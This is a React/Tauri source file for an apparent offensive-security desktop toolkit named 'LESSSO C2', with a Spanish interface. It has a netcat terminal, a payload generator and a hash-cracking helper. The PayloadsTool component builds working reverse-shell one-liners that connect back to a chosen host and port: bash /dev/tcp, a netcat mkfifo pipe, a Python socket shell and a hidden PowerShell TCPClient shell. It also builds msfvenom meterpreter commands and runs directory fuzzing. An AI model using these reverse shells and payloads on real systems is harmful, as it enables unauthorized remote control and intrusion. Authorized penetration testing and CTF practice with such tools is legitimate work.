import { useState, useEffect, useRef } from 'react'
import { invoke } from '@tauri-apps/api/core'
import { listen } from '@tauri-apps/api/event'
import { open as openDialog } from '@tauri-apps/plugin-dialog'
import { Terminal } from '@xterm/xterm'
import { FitAddon } from '@xterm/addon-fit'
import { useScanStore } from '../../core/store/useScanStore'
import '@xterm/xterm/css/xterm.css'

export function NetcatTool() {
  const [ncMode, setNcMode] = useState<'listen' | 'connect'>('listen')
  const [ncIp, setNcIp] = useState('')
  const [ncPort, setNcPort] = useState('4444')
  const [ncNoDns, setNcNoDns] = useState(true) 
  const [ncVerbose, setNcVerbose] = useState(true) 
  
  const [isActive, setIsActive] = useState(false);
  const [sessionId, setSessionId] = useState('');
  
  const termRef = useRef<HTMLDivElement>(null);
  const terminalInstance = useRef<Terminal | null>(null);
  const unlistenFuncs = useRef<Array<() => void>>([]);

  const stopTerminal = async () => {
    if (sessionId) { await invoke('kill_terminal', { sessionId }); terminalInstance.current?.writeln('\r\n\x1b[1;31m[!] Sesión local terminada.\x1b[0m'); }
    setIsActive(false);
  }

  const startTerminal = async () => {
    const sid = Date.now().toString(); setSessionId(sid); setIsActive(true);
    setTimeout(async () => {
      if (!termRef.current) return;
      termRef.current.innerHTML = ''; 
      const term = new Terminal({ theme: { background: '#0b1120', foreground: '#34d399', cursor: '#34d399' }, fontSize: 13, fontFamily: 'monospace', cursorBlink: true });
      const fitAddon = new FitAddon(); term.loadAddon(fitAddon); term.open(termRef.current); fitAddon.fit(); terminalInstance.current = term;
      term.writeln('\x1b[1;36m[*] LESSSO C2 - Inicializando Terminal Local (Bash)...\x1b[0m');

      const unlistenOut = await listen<string>(`term-output-${sid}`, (e) => { term.write(e.payload.replace(/\n/g, '\r\n')); });
      const unlistenExit = await listen(`term-exit-${sid}`, () => { term.writeln('\r\n\x1b[1;33m[*] Proceso finalizado.\x1b[0m'); setIsActive(false); });
      unlistenFuncs.current.push(unlistenOut, unlistenExit);
      term.onData(data => { invoke('write_terminal', { sessionId: sid, data }).catch(() => {}); });
      try { await invoke('start_terminal', { sessionId: sid, cmd: '/bin/bash', args: ['-i'] }); } catch (err) { term.writeln(`\r\n\x1b[1;31m[!] Error del Sistema: ${err}\x1b[0m`); setIsActive(false); }

      const resizeHandler = () => fitAddon.fit(); window.addEventListener('resize', resizeHandler);
      unlistenFuncs.current.push(() => window.removeEventListener('resize', resizeHandler));
    }, 100);
  }

  const injectNetcatCommand = () => {
    if (!sessionId) return;
    let cmd = 'nc '; if (ncNoDns) cmd += '-n '; if (ncVerbose) cmd += '-v ';
    if (ncMode === 'listen') { cmd += `-l -p ${ncPort}`; } else { cmd += `${ncIp || '<IP>'} ${ncPort}`; }
    invoke('write_terminal', { sessionId, data: cmd + '\n' }).catch(() => {});
  }

  const injectTtyMacro = () => {
    if (!sessionId) return;
    const macro = `python3 -c 'import pty;pty.spawn("/bin/bash")'\nexport TERM=xterm\nstty rows 40 columns 100\n`;
    invoke('write_terminal', { sessionId, data: macro }).catch(() => {});
  }

  useEffect(() => { return () => { unlistenFuncs.current.forEach(f => f()); if (sessionId) invoke('kill_terminal', { sessionId }).catch(()=>{}); } }, [sessionId]);

  return (
    <div className="flex flex-col h-full overflow-hidden p-1">
      {!isActive ? (
        <div className="flex flex-col items-center justify-center h-full text-center p-4">
          <div className="w-16 h-16 bg-teal-100 dark:bg-[#0b282c]/30 text-[#0b282c] dark:text-teal-400 rounded-full flex items-center justify-center text-3xl mb-4 shadow-sm border border-teal-200 dark:border-[#0b282c]/50">🖥️</div>
          <h3 className="text-sm font-bold text-slate-700 dark:text-slate-300 mb-2">Terminal Local Inactiva</h3>
          <p className="text-[11px] text-slate-500 mb-6 max-w-sm">Inicia una sesión de Bash local. Podrás inyectar Netcat o usar SSH sin salir de LESSSO C2.</p>
          <button onClick={startTerminal} className="bg-[#0b282c] hover:bg-[#081e21] text-white font-bold py-2.5 px-8 rounded shadow-lg shadow-[#0b282c]/20 transition-all uppercase text-[11px] tracking-wider">
            INICIAR BASH LOCAL
          </button>
        </div>
      ) : (
        <div className="flex flex-col h-full bg-slate-900 rounded-lg overflow-hidden border border-slate-700">
          <div className="bg-slate-800 p-2 border-b border-slate-700 flex flex-col gap-2 shrink-0">
            <div className="flex justify-between items-center">
               <div className="flex items-center gap-3">
                 <span className="text-[10px] font-bold text-slate-300 uppercase flex items-center gap-2 tracking-wider"><span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span> BASH SESSION</span>
                 <button onClick={injectTtyMacro} className="bg-purple-600 hover:bg-purple-500 text-white px-2 py-0.5 rounded text-[9px] font-bold uppercase shadow-sm flex items-center gap-1 transition-colors" title="Inyectar macro Python PTY">Estabilizar TTY ✨</button>
               </div>
               <button onClick={stopTerminal} className="text-[9px] bg-red-900/50 text-red-400 hover:bg-red-500 hover:text-white px-3 py-1 rounded font-bold uppercase transition-colors tracking-widest">Terminar Shell</button>
            </div>
            <div className="bg-slate-900/80 p-1.5 rounded border border-slate-700 flex flex-wrap gap-2 items-center">
              <div className="flex bg-slate-800 rounded">
                <button onClick={() => setNcMode('listen')} className={`px-2 py-1 text-[9px] font-bold rounded-sm uppercase transition-colors ${ncMode === 'listen' ? 'bg-[#0b282c] text-white' : 'text-slate-400'}`}>Listen</button>
                <button onClick={() => setNcMode('connect')} className={`px-2 py-1 text-[9px] font-bold rounded-sm uppercase transition-colors ${ncMode === 'connect' ? 'bg-red-600 text-white' : 'text-slate-400'}`}>Conectar</button>
              </div>
              {ncMode === 'connect' && <input type="text" value={ncIp} onChange={e => setNcIp(e.target.value)} placeholder="IP Destino" className="w-28 px-2 py-1 bg-slate-800 border border-slate-600 rounded text-[10px] text-white outline-none font-mono" />}
              <input type="text" value={ncPort} onChange={e => setNcPort(e.target.value)} placeholder="Puerto" className="w-20 px-2 py-1 bg-slate-800 border border-slate-600 rounded text-[10px] font-mono text-white outline-none" />
              <label className="flex items-center space-x-1.5 cursor-pointer" title="Evita consultas DNS (-n)"><input type="checkbox" checked={ncNoDns} onChange={() => setNcNoDns(!ncNoDns)} className="rounded text-teal-500 accent-teal-500" /><span className="text-[9px] font-bold text-slate-300">-n</span></label>
              <label className="flex items-center space-x-1.5 cursor-pointer" title="Verbose (-v)"><input type="checkbox" checked={ncVerbose} onChange={() => setNcVerbose(!ncVerbose)} className="rounded text-teal-500 accent-teal-500" /><span className="text-[9px] font-bold text-slate-300">-v</span></label>
              <button onClick={injectNetcatCommand} className="ml-auto bg-emerald-600 hover:bg-emerald-500 text-white px-4 py-1 rounded text-[9px] font-bold uppercase shadow-sm transition-colors">Inyectar Netcat ↵</button>
            </div>
          </div>
          <div ref={termRef} className="flex-1 w-full h-full p-2 bg-[#0b1120] overflow-hidden" />
        </div>
      )}
    </div>
  )
}

export function PayloadsTool() {
  // FUZZER NATIVO INTEGRADO AQUÍ
  const { vpnIp, startFuzzer, isFuzzing } = useScanStore();
  const [rsIp, setRsIp] = useState(vpnIp || '10.10.14.X');
  const [rsPort, setRsPort] = useState('4444');
  const [tab, setTab] = useState<'linux' | 'windows' | 'msfvenom'>('linux');

  const [msfArch, setMsfArch] = useState('x86');
  const [msfPlatform, setMsfPlatform] = useState('windows');
  const [msfFormat, setMsfFormat] = useState('exe');
  
  const [goUrl, setGoUrl] = useState('')
  const [goWordlist, setGoWordlist] = useState('/usr/share/wordlists/dirb/common.txt')
  const [ssTerm, setSsTerm] = useState('')

  useEffect(() => { if (vpnIp) setRsIp(vpnIp); }, [vpnIp]);

  const copyToClipboard = (cmd: string) => { navigator.clipboard.writeText(cmd); alert(`Copiado al portapapeles!`); }

  const browseWordlist = async () => {
    try {
      const selected = await openDialog({ title: 'Seleccionar Wordlist (Diccionario)', filters: [{ name: 'Text Files', extensions: ['txt', 'list', 'csv'] }] });
      if (selected && !Array.isArray(selected)) { setGoWordlist(selected); }
    } catch (err) { console.error(err); }
  };

  const getRevShell = (type: string) => {
    if(type === 'bash') return `bash -c 'bash -i >& /dev/tcp/${rsIp}/${rsPort} 0>&1'`;
    if(type === 'nc') return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${rsIp} ${rsPort} >/tmp/f`;
    if(type === 'python') return `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${rsIp}",${rsPort}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("sh")'`;
    return '';
  }
  const getMsfVenom = () => `msfvenom -p ${msfPlatform}/${msfArch}/meterpreter/reverse_tcp LHOST=${rsIp} LPORT=${rsPort} -f ${msfFormat} -o shell.${msfFormat}`;
  const getSearchsploitCmd = () => `searchsploit ${ssTerm || '<software_version>'}`;

  return (
    <div className="flex flex-col h-full overflow-y-auto custom-scrollbar p-3 space-y-4">
      <div className="flex border-b border-slate-200 dark:border-slate-800">
        <button onClick={() => setTab('linux')} className={`pb-1.5 px-3 text-[10px] font-bold uppercase border-b-2 ${tab === 'linux' ? 'border-emerald-500 text-emerald-600 dark:text-emerald-400' : 'border-transparent text-slate-400 hover:text-slate-600'}`}>Linux RS</button>
        <button onClick={() => setTab('windows')} className={`pb-1.5 px-3 text-[10px] font-bold uppercase border-b-2 ${tab === 'windows' ? 'border-blue-500 text-blue-600 dark:text-blue-400' : 'border-transparent text-slate-400 hover:text-slate-600'}`}>Windows RS</button>
        <button onClick={() => setTab('msfvenom')} className={`pb-1.5 px-3 text-[10px] font-bold uppercase border-b-2 ${tab === 'msfvenom' ? 'border-[#0b282c] text-[#0b282c] dark:border-teal-500 dark:text-teal-400' : 'border-transparent text-slate-400 hover:text-slate-600'}`}>MSFVenom</button>
      </div>

      <div className="flex gap-2">
        <input type="text" value={rsIp} onChange={e => setRsIp(e.target.value)} placeholder="LHOST (Tu IP)" className="flex-1 px-2 py-1.5 bg-slate-50 dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none" />
        <input type="text" value={rsPort} onChange={e => setRsPort(e.target.value)} placeholder="LPORT" className="w-20 px-2 py-1.5 bg-slate-50 dark:bg-slate-900 border border-slate-200 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none" />
      </div>

      {tab === 'linux' && (
        <div className="space-y-1.5 border-b border-slate-200 dark:border-slate-800 pb-4">
          <button onClick={() => copyToClipboard(getRevShell('bash'))} className="w-full text-left px-3 py-2 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 rounded text-[11px] font-mono text-slate-700 dark:text-slate-300 truncate">{"Bash: bash -i >& /dev/tcp/..."}</button>
          <button onClick={() => copyToClipboard(getRevShell('nc'))} className="w-full text-left px-3 py-2 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 rounded text-[11px] font-mono text-slate-700 dark:text-slate-300 truncate">{"Netcat: mkfifo /tmp/f..."}</button>
          <button onClick={() => copyToClipboard(getRevShell('python'))} className="w-full text-left px-3 py-2 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 rounded text-[11px] font-mono text-slate-700 dark:text-slate-300 truncate">{"Python3: import socket..."}</button>
        </div>
      )}

      {tab === 'windows' && (
        <div className="space-y-1.5 border-b border-slate-200 dark:border-slate-800 pb-4">
          <button onClick={() => copyToClipboard(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${rsIp}",${rsPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`)} className="w-full text-left px-3 py-2 bg-blue-50 dark:bg-blue-900/10 hover:bg-blue-100 dark:hover:bg-blue-900/30 rounded text-[11px] font-mono text-blue-800 dark:text-blue-300 truncate">PowerShell (TcpClient)</button>
        </div>
      )}

      {tab === 'msfvenom' && (
        <div className="space-y-2 p-2 bg-teal-50 dark:bg-[#0b282c]/10 border border-teal-200 dark:border-[#0b282c]/50 rounded-lg mb-4">
           <div className="grid grid-cols-2 gap-2">
             <select value={msfPlatform} onChange={e => setMsfPlatform(e.target.value)} className="px-2 py-1 text-[10px] font-bold bg-white dark:bg-slate-900 border border-teal-300 dark:border-teal-700 rounded outline-none dark:text-white">
               <option value="windows">Windows</option><option value="linux">Linux</option><option value="osx">Mac OSX</option>
             </select>
             <select value={msfArch} onChange={e => setMsfArch(e.target.value)} className="px-2 py-1 text-[10px] font-bold bg-white dark:bg-slate-900 border border-teal-300 dark:border-teal-700 rounded outline-none dark:text-white">
               <option value="x86">x86 (32 bits)</option><option value="x64">x64 (64 bits)</option>
             </select>
           </div>
           <select value={msfFormat} onChange={e => setMsfFormat(e.target.value)} className="w-full px-2 py-1 text-[10px] font-bold bg-white dark:bg-slate-900 border border-teal-300 dark:border-teal-700 rounded outline-none dark:text-white">
               <option value="exe">.exe (Windows)</option><option value="elf">.elf (Linux)</option><option value="raw">Raw (Shellcode)</option>
           </select>
           <button onClick={() => copyToClipboard(getMsfVenom())} className="w-full bg-[#0b282c] hover:bg-[#081e21] text-white px-3 py-2 rounded text-[10px] font-bold uppercase shadow-sm transition-colors">Copiar MSFVenom Cmd</button>
        </div>
      )}

      <div className="space-y-3">
        <h3 className="text-[10px] tracking-widest font-black text-orange-600 dark:text-orange-400 uppercase border-b border-slate-200 dark:border-slate-800 pb-1">Fuzzer Nativo (Gobuster)</h3>
        <input type="text" value={goUrl} onChange={e => setGoUrl(e.target.value)} placeholder="URL: http://target.com" className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs dark:text-white outline-none" />
        
        <div className="flex gap-1.5">
          <input list="wordlists-options" value={goWordlist} onChange={e => setGoWordlist(e.target.value)} placeholder="Ruta a wordlist..." className="flex-1 px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-[10px] font-mono dark:text-white outline-none" />
          <datalist id="wordlists-options"><option value="/usr/share/wordlists/dirb/common.txt" /><option value="/usr/share/wordlists/dirb/big.txt" /><option value="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" /></datalist>
          <button onClick={browseWordlist} className="px-2 py-1.5 bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-300 text-[10px] font-bold rounded hover:bg-slate-300 dark:hover:bg-slate-700 transition-colors">Examinar...</button>
        </div>

        {/* LANZADOR NATIVO - ELIMINADO EL COPIAR PORTAPAPELES */}
        <button onClick={() => startFuzzer(goUrl, goWordlist)} disabled={isFuzzing || !goUrl} className="w-full bg-orange-500 disabled:bg-orange-300 text-white px-3 py-2.5 rounded text-xs font-black shadow-lg hover:bg-orange-600 transition-colors flex items-center justify-center gap-2">
          {isFuzzing ? <span className="animate-pulse">FUZZEANDO...</span> : '🚀 LANZAR FUZZER'}
        </button>
      </div>

      <div className="space-y-3 pt-4 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-[10px] tracking-widest font-black text-sky-600 dark:text-sky-400 uppercase border-b border-slate-200 dark:border-slate-800 pb-1">Searchsploit</h3>
        <input type="text" value={ssTerm} onChange={e => setSsTerm(e.target.value)} placeholder="Servicio: Apache 2.4.49" className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs dark:text-white outline-none" />
        <button onClick={() => copyToClipboard(getSearchsploitCmd())} className="w-full bg-sky-100 text-sky-700 dark:bg-sky-900/30 dark:text-sky-400 px-3 py-1.5 rounded text-xs font-bold hover:bg-sky-200 border border-sky-200 dark:border-sky-800/50 transition-colors">Copiar Comando</button>
      </div>
    </div>
  )
}

export function DecodersTool() {
  const [inputText, setInputText] = useState('')
  const [outputText, setOutputText] = useState('')
  const [detectedType, setDetectedType] = useState('Texto Plano')
  const [hashMode, setHashMode] = useState('0')
  const [hashWordlist, setHashWordlist] = useState('/usr/share/wordlists/rockyou.txt')

  const copyToClipboard = (cmd: string) => { navigator.clipboard.writeText(cmd); alert(`Copiado al portapapeles!`); }
  const browseHashWordlist = async () => { try { const selected = await openDialog({ title: 'Seleccionar Wordlist para Hashcat', filters: [{ name: 'Text Files', extensions: ['txt', 'list'] }] }); if (selected && !Array.isArray(selected)) setHashWordlist(selected); } catch (err) {} };

  const handleJWT = () => {
    try { const parts = inputText.split('.'); if (parts.length !== 3) throw new Error("No es un JWT válido"); const header = JSON.parse(atob(parts[0])); const payload = JSON.parse(atob(parts[1])); setOutputText(`--- HEADER ---\n${JSON.stringify(header, null, 2)}\n\n--- PAYLOAD ---\n${JSON.stringify(payload, null, 2)}\n\n--- SIGNATURE ---\n(Firma presente)`); } catch { setOutputText('Error: No es un JSON Web Token (JWT) válido.'); }
  }

  const handleDecode = (type: 'b64_encode' | 'b64_decode' | 'url_encode' | 'url_decode') => {
    try { if (type === 'b64_encode') setOutputText(btoa(inputText)); if (type === 'b64_decode') setOutputText(atob(inputText)); if (type === 'url_encode') setOutputText(encodeURIComponent(inputText)); if (type === 'url_decode') setOutputText(decodeURIComponent(inputText)); } catch { setOutputText('Error: Entrada inválida.'); }
  }

  useEffect(() => {
    const text = inputText.trim();
    if (!text) { setDetectedType('Texto Plano'); return; }
    if (text.split('.').length === 3 && text.startsWith('eyJ')) { setDetectedType('JSON Web Token (JWT)'); return; }
    if (/^[A-Za-z0-9+/=]+$/.test(text) && text.length % 4 === 0 && !text.includes(' ')) { setDetectedType('Posible Base64'); return; }
    if (text.includes('%') && text.length > 5) { setDetectedType('URL Encoded'); return; }
    if (/^[a-fA-F0-9]{32}$/.test(text)) { setDetectedType('Hash: MD5'); setHashMode('0'); return; }
    if (/^[a-fA-F0-9]{40}$/.test(text)) { setDetectedType('Hash: SHA1'); setHashMode('100'); return; }
    if (/^[a-fA-F0-9]{64}$/.test(text)) { setDetectedType('Hash: SHA256'); setHashMode('1400'); return; }
    if (text.startsWith('$1$')) { setDetectedType('Hash: MD5 Crypt'); setHashMode('500'); return; }
    if (text.startsWith('$2a$') || text.startsWith('$2b$') || text.startsWith('$2y$')) { setDetectedType('Hash: Bcrypt'); setHashMode('3200'); return; }
    if (text.startsWith('$6$')) { setDetectedType('Hash: SHA512 Crypt'); setHashMode('1800'); return; }
    setDetectedType('Texto Plano');
  }, [inputText])

  return (
    <div className="flex flex-col h-full overflow-y-auto custom-scrollbar p-3">
      <div className="flex justify-between items-center border-b border-slate-200 dark:border-slate-800 pb-1 mb-3"><h3 className="text-[10px] tracking-widest font-black text-fuchsia-600 dark:text-fuchsia-400 uppercase">Criptografía</h3><span className="text-[9px] font-bold text-slate-400 bg-slate-100 dark:bg-slate-800 px-2 py-0.5 rounded">{detectedType}</span></div>
      <textarea value={inputText} onChange={(e) => setInputText(e.target.value)} placeholder="Pega un Hash, Base64, URL o JWT..." className="w-full h-24 p-2 text-xs bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded-md outline-none dark:text-slate-200 font-mono resize-none shrink-0 mb-3" />
      <div className="flex flex-wrap gap-2 mb-3">
        <button onClick={() => handleDecode('b64_decode')} className="flex-1 px-2 py-1.5 bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-400 text-[10px] font-bold rounded hover:bg-indigo-200">B64 Dec</button>
        <button onClick={() => handleDecode('b64_encode')} className="flex-1 px-2 py-1.5 bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-200 text-[10px] font-bold rounded hover:bg-slate-300">B64 Enc</button>
        <button onClick={() => handleDecode('url_decode')} className="flex-1 px-2 py-1.5 bg-indigo-100 dark:bg-indigo-900/50 text-indigo-700 dark:text-indigo-400 text-[10px] font-bold rounded hover:bg-indigo-200">URL Dec</button>
        <button onClick={() => handleDecode('url_encode')} className="flex-1 px-2 py-1.5 bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-200 text-[10px] font-bold rounded hover:bg-slate-300">URL Enc</button>
      </div>
      <button onClick={handleJWT} className="w-full mb-3 px-3 py-1.5 bg-fuchsia-100 dark:bg-fuchsia-900/50 text-fuchsia-700 dark:text-fuchsia-400 text-[10px] font-bold uppercase rounded border border-fuchsia-200 dark:border-fuchsia-800/50 hover:bg-fuchsia-200 transition-colors">Decodificar JWT</button>
      <textarea value={outputText} readOnly placeholder="Resultado..." className="w-full h-32 p-2 text-[11px] bg-indigo-50 dark:bg-indigo-900/10 border border-indigo-100 dark:border-indigo-900/50 rounded-md outline-none text-indigo-900 dark:text-indigo-300 font-mono resize-none custom-scrollbar shrink-0 mb-4" />
      <div className="border-t border-slate-200 dark:border-slate-800 pt-3">
         <h3 className="text-[10px] tracking-widest font-black text-rose-600 dark:text-rose-400 uppercase mb-2">Generador Hashcat</h3>
         <div className="flex gap-2 mb-2">
            <div className="flex-1"><label className="text-[8px] font-bold text-slate-500 uppercase">Hash Mode (-m)</label><input type="text" value={hashMode} onChange={e => setHashMode(e.target.value)} placeholder="0 (MD5)" className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none" /></div>
            <div className="flex-1"><label className="text-[8px] font-bold text-slate-500 uppercase">Ataque (-a)</label><select className="w-full px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-xs font-mono dark:text-white outline-none"><option value="0">0 (Diccionario)</option></select></div>
         </div>
         <label className="text-[8px] font-bold text-slate-500 uppercase">Wordlist</label>
         <div className="flex gap-1.5 mb-2">
           <input type="text" value={hashWordlist} onChange={e => setHashWordlist(e.target.value)} placeholder="Ruta a wordlist..." className="flex-1 px-2 py-1.5 bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 rounded text-[10px] font-mono dark:text-white outline-none" />
           <button onClick={browseHashWordlist} className="px-2 py-1.5 bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-300 text-[10px] font-bold rounded hover:bg-slate-300 dark:hover:bg-slate-700 transition-colors">Examinar...</button>
         </div>
         <button onClick={() => copyToClipboard(`hashcat -m ${hashMode} -a 0 hash.txt "${hashWordlist}"`)} className="w-full bg-[#0b282c] text-white px-3 py-1.5 rounded text-xs font-bold hover:bg-[#081e21] transition-colors shadow-sm">Copiar Comando Hashcat</button>
      </div>
    </div>
  )
}
